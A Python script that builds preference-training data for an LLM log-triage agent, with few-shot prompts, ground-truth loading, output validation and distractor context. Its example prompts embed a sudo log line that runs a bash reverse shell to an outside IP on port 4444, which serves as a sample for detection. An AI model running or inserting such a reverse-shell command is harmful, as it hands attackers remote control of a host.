import os
import sys
import json
import logging
import re
import random
import argparse
from typing import Optional, List, Dict, Any, Tuple

# Ensure project root is in sys.path
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from langchain_core.messages import SystemMessage, HumanMessage, AIMessage, BaseMessage
from config.llm_factory import get_llm, load_config
from tools.vector_store import VectorStoreManager
from tools.utils import parse_llm_response

logger = logging.getLogger("dpo_engine")

# ==============================================================================
# 1. System Prompts & Few-Shot Templates
# ==============================================================================

QUERY_GEN_SYSTEM = (
    "You are a technical keyword extractor for SOC logs. "
    "First, provide a curated, disciplined 3-step triage analysis inside <think>...</think> tags:\n"
    "<think>\n"
    "1. log_source: (e.g., syslog, journalctl, auditd, auth.log, web_access, or application)\n"
    "2. target_entities: (e.g., users, commands, processes, paths, IPs, sockets, or ports)\n"
    "3. observed_intent: (e.g., user_auth, admin_maintenance, privilege_escalation, code_exec, recon, data_access, etc.)\n"
    "</think>"
    "Then, return only 2 to 4 technical keywords, separated by commas, that could match MITRE ATT&CK techniques for this log."
)

QUERY_GEN_FEW_SHOT_USER = (
    'Logs to analyze:\n'
    'Jan 15 14:22:10 web-prod sudo[28910]: www-data : TTY=unknown ; PWD=/var/www/html ; USER=root ; '
    'COMMAND=/bin/bash -c "bash -i >& /dev/tcp/198.51.100.23/4444 0>&1"'
)

QUERY_GEN_FEW_SHOT_AI = (
    "<think>\n"
    "1. log_source: syslog (from format), user=www-data, binary=sudo/bash, socket=/dev/tcp/198.51.100.23/4444\n"
    "2. target_entities: user=www-data, binary=sudo/bash, socket=/dev/tcp/198.51.100.23/4444\n"
    "3. observed_intent: reverse_shell, tcp, code_exec, privilege_escalation\n"
    "</think>\n"
    "sudo, bash, reverse shell, privilege escalation"
)

SYNTHESIS_SYSTEM = (
    "You are an expert autonomous SOC EDR agent. Analyze the provided logs.\n"
    "Crucial instruction: The retrieved MITRE context might contain false leads "
    "or distractor techniques. If the log shows benign system/admin activity, "
    "ignore the context and mark status as 'clear'. Verify MITRE IDs strictly.\n\n"
    "Structure your response strictly in two parts:\n"
    "1. In <think>...</think> tags, write ONLY these 4 concise lines:\n"
    "1. log_source: (e.g., syslog, journalctl, auditd, auth.log, web_access, or application)\n"
    "2. target_entities: (e.g., users, commands, processes, paths, IPs, sockets, or ports)\n"
    "3. observed_intent: (e.g., user_auth, admin_maintenance, privilege_escalation, code_exec, recon, etc.)\n"
    "4. threat_assessment: (e.g., benign_admin, system_noise, confirmed_attack - assess MITRE context relevance)\n\n"
    "2. Immediately after </think>, output the JSON object conforming to this schema:\n"
    "{\n"
    '  "status": "alert" | "suspicious" | "clear",\n'
    '  "category": "security" | "system_warning" | "noise",\n'
    '  "mitre_id": "T1059.004" | null,\n'
    '  "confidence": "low" | "medium" | "high",\n'
    '  "reasoning": "Rationale string...",\n'
    '  "recommended_action": "Remediation string or null"\n'
    "}"
)

SYNTHESIS_FEW_SHOT_USER = (
    "Raw Logs:\n"
    "Jan 15 14:22:10 web-prod sudo[28910]: www-data : TTY=unknown ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/bash -c \"bash -i >& /dev/tcp/198.51.100.23/4444 0>&1\"\n\n"
    "Retrieved MITRE Context:\n"
    "MITRE ID: T1059.004\nTechnique Name: Unix Shell\nDescription: Adversaries may abuse Unix shells to execute arbitrary commands."
)

SYNTHESIS_FEW_SHOT_AI = (
    "<think>\n"
    "1. log_source: syslog / sudo on web-prod\n"
    "2. target_entities: user=www-data, binary=sudo/bash, socket=/dev/tcp/198.51.100.23/4444\n"
    "3. observed_intent: interactive reverse shell execution with elevated root privileges\n"
    "4. threat_assessment: confirmed_attack (matches MITRE T1059.004 Unix Shell)\n"
    "</think>\n"
    "{\n"
    '  "status": "alert",\n'
    '  "category": "security",\n'
    '  "mitre_id": "T1059.004",\n'
    '  "confidence": "high",\n'
    '  "reasoning": "Execution of an interactive bash reverse shell via sudo to an external IP (198.51.100.23:4444) by www-data.",\n'
    '  "recommended_action": "Isolate host web-prod, terminate process 28910, block external IP 198.51.100.23."\n'
    "}"
)


# ==============================================================================
# 2. Multi-Scenario & Chunk Loaders
# ==============================================================================

def parse_chunks_from_log_file(filepath: str) -> Dict[str, str]:
    """
    Parses individual chunks from a log file formatted with chunk demarcations:
    # --- START CHUNK: <chunk_id> ... ---
    ...
    # --- END CHUNK: <chunk_id> ---
    """
    chunks = {}
    if not os.path.exists(filepath):
        return chunks

    with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
        content = f.read()

    pattern = re.compile(r"#\s*---\s*START CHUNK:\s*([^\s\(\)]+)[^\n]*\n(.*?)\n#\s*---\s*END CHUNK:\s*\1\s*---", re.DOTALL)
    for match in pattern.finditer(content):
        chunk_id = match.group(1).strip()
        chunk_body = match.group(2).strip()
        chunks[chunk_id] = chunk_body

    return chunks


def load_scenario_chunks(
    input_path: str,
    selected_scenarios: Optional[List[str]] = None,
    selected_categories: Optional[List[str]] = None,
    limit_per_category: Optional[int] = None
) -> List[Dict[str, Any]]:
    """
    Recursively discovers and loads structured chunks from scenarios containing ground_truth.json.
    
    Returns a unified list of chunk dictionaries:
    [{
        "chunk_id": "...",
        "scenario_name": "...",
        "source_host": "...",
        "log_file": "...",
        "log_type": "...",
        "expected_status": "alert" | "suspicious" | "clear",
        "expected_category": "security" | "system_warning" | "noise",
        "expected_mitre_id": "...",
        "expected_technique_name": "...",
        "observed_intent": "...",
        "raw_logs": "...",
        "summary": "..."
    }]
    """
    if not os.path.exists(input_path):
        raise FileNotFoundError(f"Input path not found: '{input_path}'")

    scenario_dirs: List[str] = []

    # Check if input_path itself is a scenario directory
    if os.path.isdir(input_path):
        gt_file = os.path.join(input_path, "ground_truth.json")
        if os.path.exists(gt_file):
            scenario_dirs.append(os.path.abspath(input_path))
        else:
            # Scan subdirectories for ground_truth.json
            for root, dirs, files in os.walk(input_path):
                if "ground_truth.json" in files:
                    scenario_dirs.append(os.path.abspath(root))
    elif os.path.isfile(input_path):
        # Direct ground_truth.json file
        if input_path.endswith("ground_truth.json"):
            scenario_dirs.append(os.path.abspath(os.path.dirname(input_path)))

    scenario_dirs = sorted(list(set(scenario_dirs)))
    logger.info("Discovered %d scenario directories in '%s'", len(scenario_dirs), input_path)

    all_chunks: List[Dict[str, Any]] = []
    category_counts: Dict[str, int] = {}

    for s_dir in scenario_dirs:
        scenario_name = os.path.basename(s_dir.rstrip("/"))
        if selected_scenarios and scenario_name not in selected_scenarios:
            continue

        gt_path = os.path.join(s_dir, "ground_truth.json")
        try:
            with open(gt_path, "r", encoding="utf-8") as f:
                ground_truth = json.load(f)
        except Exception as e:
            logger.warning("Failed to load ground truth in '%s': %s", gt_path, e)
            continue

        # Pre-parse all .log files in scenario directory
        log_chunk_map: Dict[str, str] = {}
        for fname in os.listdir(s_dir):
            if fname.endswith(".log"):
                log_chunk_map.update(parse_chunks_from_log_file(os.path.join(s_dir, fname)))

        for chunk_id, meta in ground_truth.items():
            status = (meta.get("status") or "clear").lower()
            if selected_categories and status not in selected_categories:
                continue

            if limit_per_category:
                current_cnt = category_counts.get(status, 0)
                if current_cnt >= limit_per_category:
                    continue

            # Extract raw log text
            raw_logs = log_chunk_map.get(chunk_id)
            if not raw_logs:
                log_file_rel = meta.get("log_file")
                if log_file_rel:
                    specific_path = os.path.join(s_dir, log_file_rel)
                    specific_map = parse_chunks_from_log_file(specific_path)
                    raw_logs = specific_map.get(chunk_id)

            if not raw_logs:
                logger.debug("Raw logs not found for chunk '%s' in scenario '%s'", chunk_id, scenario_name)
                continue

            category_counts[status] = category_counts.get(status, 0) + 1

            chunk_item = {
                "chunk_id": chunk_id,
                "scenario_name": scenario_name,
                "source_host": meta.get("source_host", "unknown"),
                "log_file": meta.get("log_file", ""),
                "log_type": meta.get("log_type", "auditd"),
                "expected_status": status,
                "expected_category": meta.get("category", "noise"),
                "expected_mitre_id": meta.get("mitre_id"),
                "expected_technique_name": meta.get("mitre_technique_name"),
                "observed_intent": meta.get("observed_intent", "unknown"),
                "raw_logs": raw_logs.strip(),
                "summary": meta.get("summary", "")
            }
            all_chunks.append(chunk_item)

    logger.info("Loaded %d total chunk(s) across %d scenario(s)", len(all_chunks), len(scenario_dirs))
    return all_chunks


# Fallback for plain log files without ground truth
def load_plain_log_targets(logs_path: str) -> List[Tuple[str, str]]:
    if not os.path.exists(logs_path):
        raise FileNotFoundError(f"Logs path not found: '{logs_path}'")

    results: List[Tuple[str, str]] = []
    if os.path.isfile(logs_path):
        with open(logs_path, "r", encoding="utf-8") as f:
            results.append((logs_path, f.read()))
    elif os.path.isdir(logs_path):
        entries = sorted(os.listdir(logs_path))
        for entry in entries:
            full_path = os.path.join(logs_path, entry)
            if os.path.isfile(full_path) and full_path.endswith((".log", ".txt")):
                with open(full_path, "r", encoding="utf-8") as f:
                    results.append((full_path, f.read()))
    return results


# ==============================================================================
# 3. Validation & Formatting Helpers
# ==============================================================================

def format_dpo_response(thinking: Optional[str], output: str) -> str:
    """Formats the response with <think>...</think> if thinking is present."""
    clean_output = output.strip() if output else ""
    if thinking and "</think>" in clean_output:
        clean_output = clean_output.replace("</think>", "").strip()
    if thinking and thinking.strip():
        clean_thinking = thinking.strip()
        return f"<think>\n{clean_thinking}\n</think>\n{clean_output}".strip()
    return clean_output


def messages_to_dict_list(messages: List[BaseMessage]) -> List[Dict[str, str]]:
    """Converts LangChain messages to standard chat dict list format."""
    result = []
    for msg in messages:
        if isinstance(msg, SystemMessage):
            role = "system"
        elif isinstance(msg, HumanMessage):
            role = "user"
        elif isinstance(msg, AIMessage):
            role = "assistant"
        else:
            role = getattr(msg, "type", "user")
        result.append({"role": role, "content": msg.content})
    return result


def messages_to_prompt_string(messages: List[BaseMessage]) -> str:
    """Renders messages into a single text prompt."""
    rendered = []
    for msg in messages:
        if isinstance(msg, SystemMessage):
            rendered.append(f"System: {msg.content}")
        elif isinstance(msg, HumanMessage):
            rendered.append(f"User: {msg.content}")
        elif isinstance(msg, AIMessage):
            rendered.append(f"Assistant: {msg.content}")
        else:
            rendered.append(f"{getattr(msg, 'type', 'User')}: {msg.content}")
    return "\n\n".join(rendered)


def dict_list_to_messages(dict_list: List[Dict[str, str]]) -> List[BaseMessage]:
    """Converts standard chat dict list format back to LangChain messages."""
    messages: List[BaseMessage] = []
    for item in dict_list:
        role = item.get("role", "user")
        content = item.get("content", "")
        if role == "system":
            messages.append(SystemMessage(content=content))
        elif role == "assistant":
            messages.append(AIMessage(content=content))
        else:
            messages.append(HumanMessage(content=content))
    return messages


def save_dataset_atomic(dataset: List[Dict[str, Any]], out_path: str):
    """Atomically writes dataset to disk via a temp file to prevent corruption."""
    if not dataset:
        return
    os.makedirs(os.path.dirname(os.path.abspath(out_path)) or ".", exist_ok=True)
    tmp_path = f"{out_path}.tmp"
    with open(tmp_path, "w", encoding="utf-8") as f:
        json.dump(dataset, f, indent=2, ensure_ascii=False)
    os.replace(tmp_path, out_path)


def validate_synthesis_output(
    parsed_synth: Dict[str, Any],
    expected_status: str,
    distractor_injected: bool = False
) -> Tuple[bool, Optional[Dict[str, Any]], str]:
    """
    Validation of the synthesis output:
    1. Ensures valid JSON with all required keys.
    2. Soft security classification check:
       - If expected is 'alert' or 'suspicious', model must output 'alert' or 'suspicious'.
       - If expected is 'clear', model must output 'clear' and have no MITRE ID.
    3. Verifies category and fields formatting.
    """
    output_str = parsed_synth.get("output", "").strip()
    if not output_str:
        return False, None, "Empty output string from LLM"

    try:
        # Extract JSON substring if surrounded by extra text or code blocks
        json_match = re.search(r"\{.*\}", output_str, re.DOTALL)
        if not json_match:
            return False, None, "No valid JSON object found in output"
        
        data = json.loads(json_match.group(0))
    except Exception as e:
        return False, None, f"JSON parsing failed: {e}"

    # Required fields verification
    required_keys = ["status", "category", "mitre_id", "confidence", "reasoning", "recommended_action"]
    for k in required_keys:
        if k not in data:
            return False, None, f"Missing required JSON key '{k}'"

    status = str(data.get("status", "")).lower()
    expected = expected_status.lower()

    # Soft classification match check (Security threat vs Benign boundary)
    security_threat_statuses = {"alert", "suspicious"}
    if expected in security_threat_statuses:
        if status not in security_threat_statuses:
            return False, data, f"False Negative: expected threat ('{expected}'), got '{status}'"
    elif expected == "clear":
        if status != "clear":
            return False, data, f"False Positive: expected 'clear', got threat status '{status}'"

    # Category validation
    category = str(data.get("category", "")).lower()
    if category not in ["security", "system_warning", "noise"]:
        return False, data, f"Invalid category '{category}'"

    # MITRE ID consistency check
    mitre_id = data.get("mitre_id")
    if expected == "clear" and mitre_id is not None and mitre_id != "":
        return False, data, f"Benign log (clear) should not have a MITRE ID (got '{mitre_id}')"

    return True, data, "OK"


# ==============================================================================
# 4. Phase 1: Chosen Dataset Generation
# ==============================================================================

def print_good_summary(stats: Dict[str, Any], dataset: List[Dict[str, Any]], out_path: str, interrupted: bool = False):
    total = stats.get("total_evaluated", 0)
    kept = stats.get("kept", 0)
    discarded = stats.get("discarded", 0)
    status_label = "⚠️ INTERRUPTED (Partial Save)" if interrupted else "✅ COMPLETED"

    print("\n" + "=" * 65)
    print(f"📊 DPO Phase 1 ('Chosen') Generation Summary [{status_label}]:")
    print(f"  • Total Chunks in Run    : {total}")
    print(f"  • Valid Kept Chunks      : {kept} ({kept / max(1, total) * 100:.1f}%)")
    print(f"  • Discarded / Failed     : {discarded} ({discarded / max(1, total) * 100:.1f}%)")
    print(f"  • Distractors Injected   : {stats.get('distractors_injected', 0)}")
    print(f"  • Retries Triggered      : {stats.get('retried', 0)}")
    by_status = stats.get("by_status", {})
    print(f"  • Kept Breakdown         : {by_status.get('alert', 0)} Alert, {by_status.get('suspicious', 0)} Suspicious, {by_status.get('clear', 0)} Clear")
    print(f"  • Total Dataset Entries  : {len(dataset)} entries saved -> '{out_path}'")
    print("=" * 65 + "\n")


def generate_good_dataset(
    logs_path: str,
    dataset_output_path: Optional[str] = None,
    config: Optional[dict] = None,
    distractor_ratio: float = 0.15,
    max_retries: int = 2,
    limit: Optional[int] = None,
    include_query_gen: bool = True,
    resume: bool = True
) -> str:
    """
    Phase 1: Generates the 'chosen' DPO dataset using the 'good' teacher model.
    Features:
    - Multi-scenario auto-discovery & chunk loading.
    - Soft security matching (alert <-> suspicious accepted as threat signal).
    - Periodic scenario-level atomic saving + CTRL+C graceful flush.
    - Seamless resume capability.
    """
    cfg = config or load_config()
    out_path = dataset_output_path or os.path.join("data", "datasets", "cyberagent_dpo_full.json")
    os.makedirs(os.path.dirname(out_path) or ".", exist_ok=True)

    chunks = load_scenario_chunks(logs_path)
    if not chunks:
        # Fallback to plain log file processing if no scenarios discovered
        logger.warning("No ground_truth scenarios discovered. Falling back to plain log files.")
        plain_targets = load_plain_log_targets(logs_path)
        chunks = [{
            "chunk_id": os.path.splitext(os.path.basename(fp))[0],
            "scenario_name": "plain_logs",
            "source_host": "unknown",
            "log_file": fp,
            "log_type": "syslog",
            "expected_status": "alert" if "offensive" in fp else ("suspicious" if "susp" in fp else "clear"),
            "expected_category": "security" if "offensive" in fp else ("system_warning" if "susp" in fp else "noise"),
            "expected_mitre_id": None,
            "expected_technique_name": None,
            "observed_intent": "plain_log_evaluation",
            "raw_logs": content,
            "summary": "Plain log chunk"
        } for fp, content in plain_targets]

    if limit and limit > 0:
        chunks = chunks[:limit]

    good_model_name = cfg.get("llms", {}).get("good", {}).get("model", "good_model")
    logger.info("Starting DPO Phase 1 ('good' chosen generation) with %d chunks using: '%s'...", len(chunks), good_model_name)
    logger.info("Configuration: distractor_ratio=%.2f, max_retries=%d, resume=%s", distractor_ratio, max_retries, resume)

    dataset: List[Dict[str, Any]] = []
    completed_chunk_ids = set()

    # Load existing dataset if resume is active
    if resume and os.path.exists(out_path):
        try:
            with open(out_path, "r", encoding="utf-8") as f:
                existing_data = json.load(f)
            if isinstance(existing_data, list):
                dataset = existing_data
                for entry in dataset:
                    c_id = entry.get("chunk_id")
                    if c_id and entry.get("task") == "triage_synthesis":
                        completed_chunk_ids.add(c_id)
                logger.info("🔄 Resume active: Loaded %d existing entries (%d completed synthesis chunks) from '%s'",
                            len(dataset), len(completed_chunk_ids), out_path)
        except Exception as e:
            logger.warning("Could not read existing dataset for resume (%s). Starting clean.", e)
            dataset = []

    llm_good = get_llm("good", cfg)
    vsm = VectorStoreManager(config=cfg, auto_populate=True)

    stats = {
        "total_evaluated": len(chunks),
        "kept": len(completed_chunk_ids),
        "discarded": 0,
        "retried": 0,
        "distractors_injected": 0,
        "by_status": {"alert": 0, "suspicious": 0, "clear": 0}
    }

    # Count existing entries in stats
    for entry in dataset:
        if entry.get("task") == "triage_synthesis":
            st = entry.get("expected_status", "clear")
            stats["by_status"][st] = stats["by_status"].get(st, 0) + 1

    current_scenario: Optional[str] = None

    try:
        for idx, chunk in enumerate(chunks, 1):
            chunk_id = chunk["chunk_id"]
            scenario = chunk["scenario_name"]
            expected_status = chunk["expected_status"]
            content = chunk["raw_logs"]

            # Scenario transition: trigger intermediate save
            if current_scenario is not None and scenario != current_scenario:
                save_dataset_atomic(dataset, out_path)
                logger.info("💾 [Checkpoint] Scenario '%s' batch complete. Saved %d total entries -> '%s'",
                            current_scenario, len(dataset), out_path)
            current_scenario = scenario

            # Check if chunk already processed
            if chunk_id in completed_chunk_ids:
                logger.info("[%d/%d] [%s] Skipping chunk '%s' (already in dataset)...", idx, len(chunks), scenario, chunk_id)
                continue

            logger.info("[%d/%d] [%s] Processing chunk '%s' (expected: %s)...",
                        idx, len(chunks), scenario, chunk_id, expected_status)

            # -------------------------------------------------------------
            # Sub-Task 1: Query Generation (Teacher Model)
            # -------------------------------------------------------------
            search_query = ""
            if include_query_gen:
                query_messages = [
                    SystemMessage(content=QUERY_GEN_SYSTEM),
                    HumanMessage(content=QUERY_GEN_FEW_SHOT_USER),
                    AIMessage(content=QUERY_GEN_FEW_SHOT_AI),
                    HumanMessage(content=f"Logs to analyze:\n{content}")
                ]
                try:
                    raw_query_resp = llm_good.invoke(query_messages)
                    parsed_query = parse_llm_response(raw_query_resp)
                    chosen_query = format_dpo_response(parsed_query.get("thinking"), parsed_query.get("output", ""))
                    search_query = parsed_query.get("output", "").strip()

                    query_entry = {
                        "id": f"{chunk_id}_query_gen",
                        "task": "query_generation",
                        "scenario": scenario,
                        "chunk_id": chunk_id,
                        "expected_status": expected_status,
                        "messages": messages_to_dict_list(query_messages),
                        "prompt": messages_to_prompt_string(query_messages),
                        "chosen": chosen_query,
                        "rejected": "",
                        "metadata": {
                            "teacher_model": good_model_name,
                            "extracted_search_query": search_query
                        }
                    }
                    dataset.append(query_entry)
                except Exception as e:
                    logger.warning("Query generation failed for %s: %s", chunk_id, e)

            if not search_query:
                words = [w for w in content.replace("\n", " ").split() if len(w) > 3 and not w.isdigit()]
                search_query = " ".join(words[:6])

            # -------------------------------------------------------------
            # Sub-Task 2: RAG Context & Triage Synthesis with Validation & Retry
            # -------------------------------------------------------------
            inject_distractor = (
                distractor_ratio > 0 and
                random.random() < distractor_ratio and
                expected_status in ["alert", "suspicious"]
            )

            if inject_distractor:
                exclude_ids = [chunk.get("expected_mitre_id")] if chunk.get("expected_mitre_id") else []
                docs = vsm.get_random_documents(k=3, exclude_ids=exclude_ids)
                stats["distractors_injected"] += 1
                logger.debug("  [Distractor Injected] Retrieved %d random MITRE docs for %s", len(docs), chunk_id)
            else:
                docs = vsm.hybrid_search(search_query, k=3)

            context_str = "\n\n---\n\n".join([doc.page_content for doc in docs])

            synthesis_messages = [
                SystemMessage(content=SYNTHESIS_SYSTEM),
                HumanMessage(content=SYNTHESIS_FEW_SHOT_USER),
                AIMessage(content=SYNTHESIS_FEW_SHOT_AI),
                HumanMessage(content=f"Raw Logs:\n{content}\n\nRetrieved MITRE Context:\n{context_str}")
            ]

            # Multi-attempt fresh invocation (no multi-turn history contamination)
            valid = False
            chosen_synth = ""
            last_err = ""
            
            for attempt in range(1 + max_retries):
                if attempt > 0:
                    stats["retried"] += 1
                    logger.info("  -> Attempt %d/%d for %s (fresh retry)...", attempt + 1, 1 + max_retries, chunk_id)

                try:
                    # Fresh single-turn call
                    raw_synth_resp = llm_good.invoke(synthesis_messages)
                    parsed_synth = parse_llm_response(raw_synth_resp)
                    
                    is_valid, parsed_json, err = validate_synthesis_output(
                        parsed_synth,
                        expected_status=expected_status,
                        distractor_injected=inject_distractor
                    )

                    if is_valid:
                        chosen_synth = format_dpo_response(parsed_synth.get("thinking"), parsed_synth.get("output", ""))
                        valid = True
                        break
                    else:
                        last_err = err
                        logger.debug("  [Attempt %d Validation Failed] %s: %s", attempt + 1, chunk_id, err)
                except Exception as e:
                    last_err = str(e)
                    logger.warning("  [Attempt %d Error] %s: %s", attempt + 1, chunk_id, e)

            if valid:
                stats["kept"] += 1
                stats["by_status"][expected_status] = stats["by_status"].get(expected_status, 0) + 1
                completed_chunk_ids.add(chunk_id)
                
                synthesis_entry = {
                    "id": f"{chunk_id}_synthesis",
                    "task": "triage_synthesis",
                    "scenario": scenario,
                    "chunk_id": chunk_id,
                    "expected_status": expected_status,
                    "expected_category": chunk["expected_category"],
                    "expected_mitre_id": chunk["expected_mitre_id"],
                    "messages": messages_to_dict_list(synthesis_messages),
                    "prompt": messages_to_prompt_string(synthesis_messages),
                    "chosen": chosen_synth,
                    "rejected": "",
                    "metadata": {
                        "teacher_model": good_model_name,
                        "distractor_injected": inject_distractor,
                        "retrieved_chunks_count": len(docs),
                        "validation_passed": True
                    }
                }
                dataset.append(synthesis_entry)
            else:
                stats["discarded"] += 1
                logger.warning("❌ Discarded chunk '%s' after %d attempts (Reason: %s)", chunk_id, 1 + max_retries, last_err)

    except KeyboardInterrupt:
        logger.warning("\n⚠️ Process interrupted by user (CTRL+C)!")
        save_dataset_atomic(dataset, out_path)
        logger.info("💾 Emergency checkpoint saved: %d entries in '%s'", len(dataset), out_path)
        print_good_summary(stats, dataset, out_path, interrupted=True)
        return out_path

    # Final scenario save
    save_dataset_atomic(dataset, out_path)
    print_good_summary(stats, dataset, out_path, interrupted=False)
    return out_path


# ==============================================================================
# 5. Phase 2: Rejected Dataset Population (Student Model)
# ==============================================================================

def populate_bad_dataset(
    dataset_path: str,
    dataset_output_path: Optional[str] = None,
    config: Optional[dict] = None,
    limit: Optional[int] = None
) -> str:
    """
    Phase 2: Populates 'rejected' responses using the 'bad' student model against exact prompts.
    Includes scenario-level checkpoints and CTRL+C persistence.
    """
    if not os.path.exists(dataset_path):
        raise FileNotFoundError(f"DPO dataset file not found: '{dataset_path}'")

    cfg = config or load_config()
    out_path = dataset_output_path or dataset_path

    with open(dataset_path, "r", encoding="utf-8") as f:
        dataset = json.load(f)

    if not isinstance(dataset, list) or not dataset:
        raise ValueError(f"Invalid or empty dataset in '{dataset_path}'")

    if limit and limit > 0:
        dataset = dataset[:limit]

    bad_model_name = cfg.get("llms", {}).get("bad", {}).get("model", "bad_model")
    logger.info("Starting DPO Phase 2 ('bad' rejected population) with %d entries using: '%s'...", len(dataset), bad_model_name)

    llm_bad = get_llm("bad", cfg)
    current_scenario: Optional[str] = None

    try:
        for idx, entry in enumerate(dataset, 1):
            if entry.get("rejected"):
                continue  # already populated

            entry_id = entry.get("id", f"sample_{idx}")
            task = entry.get("task", "unknown")
            scenario = entry.get("scenario", "default")

            if current_scenario is not None and scenario != current_scenario:
                save_dataset_atomic(dataset, out_path)
                logger.info("💾 [Checkpoint] Scenario '%s' rejected batch complete. Saved -> '%s'", current_scenario, out_path)
            current_scenario = scenario

            logger.info("[%d/%d] Generating 'rejected' response for %s (%s)...", idx, len(dataset), entry_id, task)

            if "messages" in entry and entry["messages"]:
                messages = dict_list_to_messages(entry["messages"])
            else:
                messages = [HumanMessage(content=entry.get("prompt", ""))]

            try:
                raw_bad_resp = llm_bad.invoke(messages)
                parsed_bad = parse_llm_response(raw_bad_resp)
                rejected_formatted = format_dpo_response(parsed_bad.get("thinking"), parsed_bad.get("output", ""))
            except Exception as e:
                logger.warning("Error invoking 'bad' model on %s: %s", entry_id, e)
                rejected_formatted = ""

            entry["rejected"] = rejected_formatted
            if "metadata" not in entry:
                entry["metadata"] = {}
            entry["metadata"]["student_model"] = bad_model_name

    except KeyboardInterrupt:
        logger.warning("\n⚠️ Process interrupted by user (CTRL+C)!")
        save_dataset_atomic(dataset, out_path)
        logger.info("💾 Saved %d entries with 'rejected' populated -> '%s'", len(dataset), out_path)
        return out_path

    save_dataset_atomic(dataset, out_path)
    logger.info("✅ Successfully populated 'rejected' responses in DPO dataset (%d entries) -> '%s'", len(dataset), out_path)
    return out_path


# ==============================================================================
# 6. CLI Entrypoint
# ==============================================================================

def main():
    parser = argparse.ArgumentParser(description="CyberAgent DPO & SFT Dataset Generation Engine")
    parser.add_argument("--input", "-i", default="data/logs_training_data", help="Input directory containing scenario folders with ground_truth.json")
    parser.add_argument("--output", "-o", default="data/datasets/cyberagent_dpo_full.json", help="Output path for unified DPO dataset")
    parser.add_argument("--phase", choices=["all", "good", "bad"], default="all", help="Generation phase: 'good' (chosen only), 'bad' (rejected only), or 'all'")
    parser.add_argument("--distractor-ratio", type=float, default=0.15, help="Ratio of attack samples with pseudo-random distractor MITRE context (0.0 to 1.0)")
    parser.add_argument("--max-retries", type=int, default=2, help="Maximum fresh retry attempts for chosen validation")
    parser.add_argument("--limit", type=int, default=None, help="Optional limit on chunks processed (useful for testing)")
    parser.add_argument("--categories", type=str, default=None, help="Comma-separated categories to include (e.g., 'alert,suspicious,clear')")
    parser.add_argument("--no-query-gen", action="store_true", help="Disable query generation sub-task dataset entries")
    parser.add_argument("--resume", action="store_true", default=True, help="Resume from existing output dataset if present (default: True)")
    parser.add_argument("--no-resume", action="store_false", dest="resume", help="Overwrite existing dataset from scratch without resuming")

    args = parser.parse_args()
    logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")

    selected_cats = [c.strip().lower() for c in args.categories.split(",")] if args.categories else None

    if args.phase in ["all", "good"]:
        good_out = generate_good_dataset(
            logs_path=args.input,
            dataset_output_path=args.output,
            distractor_ratio=args.distractor_ratio,
            max_retries=args.max_retries,
            limit=args.limit,
            include_query_gen=not args.no_query_gen,
            resume=args.resume
        )

    if args.phase in ["all", "bad"]:
        target_path = args.output if args.phase == "all" else args.input
        populate_bad_dataset(
            dataset_path=target_path,
            dataset_output_path=args.output,
            limit=args.limit
        )


if __name__ == "__main__":
    main()
